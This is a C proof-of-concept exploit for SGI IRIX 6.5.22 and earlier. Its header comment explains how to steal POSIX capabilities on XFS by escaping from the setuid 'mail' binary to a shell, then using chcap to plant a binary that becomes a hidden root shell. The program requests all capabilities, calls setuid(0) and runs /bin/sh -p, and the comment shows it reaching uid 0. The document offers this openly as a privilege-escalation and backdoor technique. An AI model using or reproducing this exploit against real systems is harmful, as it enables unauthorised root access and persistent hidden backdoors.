/* SGI IRIX <= 6.5.22 capability hijacking "eip" PoC (SGI XFS)
 * ===========================================================
 * SGI IRIX implements both a SUPERUSER (BSD 'su') security model
 * with POSIX1003.6D14. This adds "capabilities" which are also
 * SGI XFS file system attributes for privilege assignment.
 *
 * POSIX1003.6D14 "capabilities"
 * =============================
 * this allows for more than just uid/gid/other assignment and
 * can be used to get privileges with "cap_accquire" etc. they are stored
 * in memory with your "u_cred" structure as part of the traditional BSD
 * security model.
 *
 * There are many capabilities defined in "sys/capabilities.h" and
 * on man capabilities(4). Capabilities are super user delegated
 * tasks but include stuff like "CAP_setuid" to call setuid();
 * even if file has no "sticky bit" under BSD UNIX such as in "UFS"
 * filing system or ext3 for instance. SGI XFS supports attributes
 * and capabilities. so do processes.
 *
 * to view SGI capabilities of a process use "ps -alP" or do
 * "ls -alP" on the file. lets demo how to steal some capabilities.
 *
 *  $ id;ls -alP `which mail`
 *  uid=993(demos) gid=997(demos)
 *  -rwsr-sr-x    1 root     mail       60604 Dec 31  1999 /usr/bin/mail []
 *  $ ls -alP captest
 *  -rwxr-xr-x    1 demos    demos      21040 May  1 20:58 captest []
 *
 * we can see "mail binary" has empty capabilities but is setuid root / mail.
 * this binary is well written and drops setuid() calls from shells etc. but...
 *
 *  $ ./captest
 *  set capabilities -1
 *  effective capabilities 0
 *  permitted capabilities 0
 *  inheritable capabilities 0
 *
 *  here is unprivileged call requesting MAXIMUM CAPABILITIES. error -1.
 *  we then output our "cap_t" structure which is really just three uint_64t
 *  values (e)ffective (p)permitted and (i)hereitable - eip - which can be passed
 *  onto child processes.
 *
 *  our current process therefore can have "e i p" capabilities set, currently it's
 *  an empty set. A process can "request" or "acquire" capabilities for its use
 *  via cap_accquire etc. "mail" is setuid root and will drop traditional privileges
 *  yet our capabilities structure (cap_t) is inherited by child.
 *
 *  $ mail -f mail ## run !sh to escape from mail to a vfork() shell
 *  From root@IRIS.lan Tue Apr 30 23:03:19 2019
 *  Return-Path: <root@IRIS.lan>
 *  Received: from IRIS.lan (localhost.lan [127.0.0.1])
 *         by IRIS.lan (SGI-8.12.5/8.12.5) with ESMTP id x4163JbG003552
 *       for <demos@IRIS.lan>; Tue, 30 Apr 2019 23:03:19 -0700 (PDT)
 *  ? !sh
 *
 * now run captest.c again....
 *
 *  $ ./captest
 *  set capabilities -1
 *  effective capabilities 0
 *  permitted capabilities 0
 *  inheritable capabilities 8000000000000000
 *
 * Notice our inheritable capabilities have now changed to a uint_64t. the
 * MSB cap_t struct holds numerous potential capabilities and flags. here is
 * what happens when you have SYS_SETUID capability (there are many many others).
 *
 *  IRIS 1% ./captest
 *  set capabilities -1
 *  effective capabilities 800
 *  permitted capabilities 800
 *  inheritable capabilities 8000000000000000
 *  IRIS 2%
 *
 * SGI XFS supports setting capabliities as attributes, so you can use this
 * as a backdoor that hides in the system many ways. SGI_SETPCAP lets you get
 * any other capability you want. Example above shows inheretince, lets change
 * our capabilities using "chcap"
 *
 *  $ id; uname -a; ls -al captest
 *  uid=993(demos) gid=997(demos)
 *  IRIX IRIS 6.5 10070055 IP22
 *  -rwxrwx---    1 demos    demos      21124 May  1 21:42 captest
 *  $ ./captest greetz
 *  set capabilities 0
 *  effective capabilities ffffffffffffffe
 *  permitted capabilities ffffffffffffffe
 *  inheritable capabilities 8ffffffffffffffe
 *  # id
 *  uid=0(root) gid=0(sys)
 *
 * Congratulations, you read to the end and can see how we can misuse capabliities
 * on SGI XFS file systems to hide root shells and find vulnerabilities like "mail"
 * to exploit. Capabilities is enabled and requires configuration to enable its
 * full potential (and attack surface...)
 *
 * here is how to find all the binaries with capabliities set in SGI XFS and
 * running processes - use "ls -alP /proc" or cat the "irix.cap" file.
 *
 * $ cat /etc/irix.cap // you will get 131 files show each kind of priviilege.
 * -cap='all= CAP_MAC_READ,CAP_DAC_READ_SEARCH+ip CAP_PRIV_PORT,CAP_MAC_MLD,
 * CAP_MAC_RELABEL_SUBJ,CAP_DAC_WRITE+p CAP_MAC_RELABEL_OPEN,CAP_FOWNER,
 * CAP_MAC_DOWNGRADE,CAP_MAC_UPGRADE,CAP_MAC_WRITE,CAP_DEVICE_MGT,
 * CAP_DAC_EXECUTE+i' sbin/chlabel
 * -cap='all= CAP_SYSINFO_MGT+i' sbin/xvminit
 *
 *   Happy Hacking
 * -- HackerFantastic
 *    (https://hacker.house)
 */
#include <stdio.h>
#include <stdlib.h>
#include <capability.h>
#include <sys/capability.h>


int main(int argc, char* argv[]){
        int ret;
        cap_t cap, newcap;
        char* argp[]={"sh","-p",0};
        char* envp[]={"",0};
        // try to set all capabilities
        newcap = cap_from_text("ALL+eip");
        ret = cap_set_proc(newcap);
        printf("set capabilities %d\n",ret);
        cap = cap_get_proc();
        printf("effective capabilities %llx\n",cap->cap_effective);
        printf("permitted capabilities %llx\n",cap->cap_permitted);
        printf("inheritable capabilities %llx\n",cap->cap_inheritable);
        if(argc > 1){
          // this file has SYS_SETUID
          setuid(0);
          setgid(0);
          execve("/bin/sh",argp,envp);
        }
}
